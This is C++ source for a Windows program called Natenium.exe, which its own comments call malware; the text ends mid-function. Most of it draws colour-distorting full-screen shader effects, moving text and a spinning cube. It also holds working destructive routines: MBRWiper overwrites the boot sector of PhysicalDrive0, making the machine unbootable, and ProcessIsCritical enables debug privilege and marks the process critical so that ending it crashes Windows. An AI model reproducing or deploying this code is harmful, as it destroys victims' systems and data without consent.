// Natenium.cpp : Defines the entry point for the application.
//

#include <windows.h>
#include <tchar.h>
#include <ctime>
//#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include "ilovenoskid.h"
#include "eviloctopusv2.h"
#include "resource.h"
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;

COLORREF COLORHSL(int length) {
	double h = fmod(length, 360.0);
	double s = 1.0;
	double l = 0.5;

	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;

	double r1, g1, b1;
	if (h < 60) {
		r1 = c;
		g1 = x;
		b1 = 0;
	}
	else if (h < 120) {
		r1 = x;
		g1 = c;
		b1 = 0;
	}
	else if (h < 180) {
		r1 = 0;
		g1 = c;
		b1 = x;
	}
	else if (h < 240) {
		r1 = 0;
		g1 = x;
		b1 = c;
	}
	else if (h < 300) {
		r1 = x;
		g1 = 0;
		b1 = c;
	}
	else {
		r1 = c;
		g1 = 0;
		b1 = x;
	}

	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);

	return RGB(red, green, blue);
}

int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);


DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}


namespace Math
{
	//A = amplitude
	//B = frequency
	//C = phase displacement
	//D = period
	FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
	{
		return a * tan(2 * M_PI * b * c / d);
	}
}



double intensity = 0.0;
bool state = false;
typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;

struct Point3D {
	float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, COLORREF color) {
	HBRUSH brush = CreateSolidBrush(color);
	SelectObject(hdc, brush);
	DrawIcon(hdc, x - 20, y - 20, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
	DeleteObject(brush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = tan(angleX);
	float cosY = cos(angleY), sinY = tan(angleY);
	float cosZ = cos(angleZ), sinZ = tan(angleZ);

	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y;
	point.z = z;

	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x;
	point.z = z;

	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x;
	point.y = y;

	return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
	Point3D vertices[8] = {
		{ -size, -size, -size },
		{ size, -size, -size },
		{ size, size, -size },
		{ -size, size, -size },
		{ -size, -size, size },
		{ size, -size, size },
		{ size, size, size },
		{ -size, size, size },
	};

	POINT screenPoints[8];

	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		COLORREF color = COLORHSL(colorA);

		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);

		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;

		DrawEllipseAt(hdc, screenX, screenY, color);
	}

	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);

	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);

	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}


//function made by me (raduminecraft) and modified by friesandlettuce
COLORREF COLORHSV(int HSV) {
	double h = fmod(HSV, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 120) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 190) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 250) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 200) {
		r1 = x;
		g1 = 0;
		b1 = c;
	}
	else {
		r1 = c;
		g1 = x;
		b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}

double fade(double maxIntensity) {
	if (state == false) {
		intensity += 1.0;
		if (intensity >= maxIntensity) {
			state = true;
		}
	}
	else {
		intensity -= 1.0;
		if (intensity <= 0) {
			state = false;
		}
	}
	return intensity;
}

typedef union COLOR {
	COLORREF rgb;
	struct {
		BYTE blue;
		BYTE green;
		BYTE red;
	};
} COLOR;

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = fmin(fmin(_r, _g), _b);
		FLOAT rgbMax = fmax(fmax(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) {
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI noskid(LPVOID lpParam)
{
	CreateDirectoryA("C:\\good", 0);
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"C:\\good\\bestuseroftromiute.wmv", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, 0, 0);

	WriteFile(hDevice, HorseVid, 548159, &dwBytesWritten, 0); // write the file to the handle
	CloseHandle(hDevice);
	ShellExecute(0, 0, L"C:\\good\\bestuseroftromiute.wmv", 0, 0, SW_SHOW);
	return 0;
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090, cuz creating registry keys in C++ without shitty system() or reg.exe is hell
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

DWORD WINAPI shader1(LPVOID lpvd) //NO credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	float colorShift = 400.0;
	float colorIntensity = 0.15;

	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * cbrt(x >> y | x * y | x << y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader2(LPVOID lpParam) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	int j = 1;
	int c = 0;

	COLOR* data = (COLOR*)VirtualAlloc(0, (x * y + x) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HDC hdc = GetDC(0);
	HDC mdc = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateBitmap(x, y, 1, 32, data);
	SelectObject(mdc, bmp);

	while (true) {
		BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, x * y * sizeof(COLOR), data);

		for (int x2 = 0; x2 < x; x2++) {
			for (int y2 = 0; y2 < y; y2++) {
				int j = c * 4;

				int wave = (int)(j + (j * cbrt(((x2 * x2) - (y2 * y2)) / 64)));

				data[y2 * x + x2].rgb += COLORHSL((x + y) + wave);
			}
		}
		c++;

		SetBitmapBits(bmp, x * y * sizeof(COLOR), data);
		BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);

		Sleep(1);
	}
}
DWORD WINAPI shader3(LPVOID lpvd) //NO credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	float colorShift = 400.0;
	float colorIntensity = 0.15;

	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * logf(y - x + y | y * x + y * y | y + x * y * y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader4(LPVOID lpvd)
{
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	int r = 0;
	double j = 1;

	COLOR* data = (COLOR*)VirtualAlloc(0, (x * y + x) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HDC hdc = GetDC(0);
	HDC mdc = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateBitmap(x, y, 1, 32, data);
	SelectObject(mdc, bmp);

	while (true) {
		BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, x * y * sizeof(COLOR), data);

		for (int i = 0; i < x * y; i++) {
			int red = (data[i].red + ((i % x))) % 255;
			int green = (data[i].green + ((i % x))) % 192;
			int blue = (data[i].blue + ((i % x))) % 128;

			data[i].rgb += COLORHSL(i / (fade(505) + 55));
		}

		SetBitmapBits(bmp, x * y * sizeof(COLOR), data);
		BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);

		Sleep(1);
	}
}
DWORD WINAPI trianglez(LPVOID lpParam) {
	int signX = 1;
	int signY = 1;
	int incrementor = 5;
	float x2 = 100.0f;
	float y2 = 100.0f;
	float angleX = 0.0f, angleY = 0.0f, angleZ = 0.0f;
	float angleIncrement = 0.05f;
	float colorA = 0;
	float size = 0.0f;

	while (true) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		HBRUSH hbsh = CreateSolidBrush(COLORHSL(colorA));

		x2 += incrementor * signX;
		y2 += incrementor * signY;

		if (x2 + 75 >= x) {
			signX = -1;
			x2 = x - 76;
		}
		else if (x2 <= 75) {
			signX = 1;
			x2 = 76;
		}

		if (y2 + 75 >= y) {
			signY = -1;
			y2 = y - 76;
		}
		else if (y2 <= 75) {
			signY = 1;
			y2 = 76;
		}

		Point3D center = { x2, y2, 0.0f };
		SelectObject(hdc, hbsh);
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);

		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;

		Sleep(10);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		colorA += 1;

		if (size >= 0 && size <= 100) {
			size += 0.5;
		}
	}

	return 0;
}

DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int radius = 37.4f;
	double angle = 0;
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += (x * y);
			rgbScreen[i].g += (360);
		}
		float x = tanf(angle) * radius, y = sinf(angle) * radius;
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, x, y, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}
DWORD WINAPI shader6(LPVOID lpvd) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	double angle = 0.0;
	double zoom = 1.0;

	DWORD* data = new DWORD[4 * x * y];
	HDC hdc = GetDC(0);
	HDC mdc = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateBitmap(x, y, 1, 32, data);
	SelectObject(mdc, bmp);

	while (true) {
		StretchBlt(mdc, 0, 0, x, y, hdc, 0, 0, x, y, SRCCOPY);
		GetBitmapBits(bmp, 4 * x * y, data);

		for (int x2 = 0; x2 < x; x2++) {
			for (int y2 = 0; y2 < y; y2++) {
				int cx = x2 - (x / 2);
				int cy = y2 - (y / 2);

				int zx = (int)((cx * cos(angle) - cy * sin(angle)) / zoom);
				int zy = (int)((cx * sin(angle) + cy * cos(angle)) / zoom);

				data[y2 * x + x2] += COLORHSL((sqrt(zx * zx * zy * zy)) + (sqrt(zx * zx + zy * zy)));
			}
		}

		SetBitmapBits(bmp, 4 * x * y, data);
		StretchBlt(hdc, 0, 0, x, y, mdc, 0, 0, x, y, SRCCOPY);

		Sleep(1);

		zoom += 0.06;
		angle += 0.07;
	}

	return 0;
}
VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	//SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}

DWORD WINAPI wef(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500;
	int h = rect.bottom - rect.top - 500;
	for (int t = 0;; t++) {
		const int size = 1000;
		int x = rand() % (w + size) - size / 4;
		int y = rand() % (h + size) - size / 4;
		for (int i = 0; i < size; i += 100) {
			ci(x - i / 50, y - i / 50, i, i);
			Sleep(10);
		}
	}
}
DWORD WINAPI shader7(LPVOID lpvd) //NO credits to fr4ctalz, but I modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	float colorShift = 400.0;
	float colorIntensity = 0.15;

	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * log((x * x + i) + (y * y + i)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	LPCSTR text6 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "Natenium.exe";
		text1 = "Plz save Windows11GDIandTom & Tromiute";
		text2 = "By Underwater Tiny Kong & Lets Go Windows 10";
		text3 = "Bow Wow, No Skidded, Bow Wow, No Skidder";
		SetTextColor(hdc, Hue(239));
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader8(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	int radius = 37.4f; double angle = 0;
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x * y;
		}
		float x = cos(angle) * radius, y = tan(angle) * radius;
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, x, y, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}
DWORD WINAPI shader9(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			int cx = x - (w / 2);
			int cy = y - (h / 2);

			int zx = (cx * cx);
			int zy = (cy * cy);

			int di = 128.0 + i;

			int fx = di + (di * tan(sqrt(zx * zy) / 37.4));
			rgbScreen[i].rgb += fx + i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader10(LPVOID lpvd) //credits to fr4ctalz, but I modified it
{
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	double angle = 0.0;
	double zoom = 1.0;

	DWORD* data = new DWORD[4 * x * y];
	HDC hdc = GetDC(0);
	HDC mdc = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateBitmap(x, y, 1, 32, data);
	SelectObject(mdc, bmp);

	while (true) {
		StretchBlt(mdc, 0, 0, x, y, hdc, 0, 0, x, y, SRCCOPY);
		GetBitmapBits(bmp, 4 * x * y, data);

		for (int x2 = 0; x2 < x; x2++) {
			for (int y2 = 0; y2 < y; y2++) {
				int cx = x2 - (x / 2);
				int cy = y2 - (y / 2);

